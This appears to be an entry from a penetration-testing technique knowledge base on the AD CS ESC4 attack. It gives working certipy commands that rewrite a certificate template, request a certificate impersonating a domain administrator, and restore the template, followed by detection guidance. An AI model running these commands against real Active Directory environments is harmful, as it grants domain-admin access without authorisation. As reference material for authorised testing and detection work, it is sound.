---
id: adcs_esc4
type: technique
label: "AD CS ESC4 (template ACL control)"
phase: "privesc"
tools: ["certipy", "certify"]
cve: null
detect: "Audit certificate-template owner, DACL, inherited rights and changes to security-sensitive template attributes."
mitre: "T1649"
tag: null
---


# AD CS ESC4 (template ACL control)

### Affected object / attribute
**Certificate template object** — `nTSecurityDescriptor` (WriteOwner / WriteDacl / GenericAll).

### Concept (deep)
The attacker holds **write access on a template**, edits it to allow **SAN supply**, exploits it as ESC1, then **restores the original ACL**. This is a **state-changing** attack and must be authorised.

### Commands
```bash
# ── Modify template to enable SAN supply ────────────────────────────
certipy template -u lowpriv@corp.local -p 'Password123!' \
  -template VulnerableTemplate -save-old

# ── Exploit as ESC1 ──────────────────────────────────────────────────
certipy req -u lowpriv@corp.local -p 'Password123!' \
  -ca CORP-CA -template VulnerableTemplate \
  -upn administrator@corp.local

# ── Restore the original ACL ─────────────────────────────────────────
certipy template -u lowpriv@corp.local -p 'Password123!' \
  -template VulnerableTemplate -restore
```

### Detection
**5136** on `pKICertificateTemplate`; monitor template ACL changes and `msPKI-*` attribute edits.

---
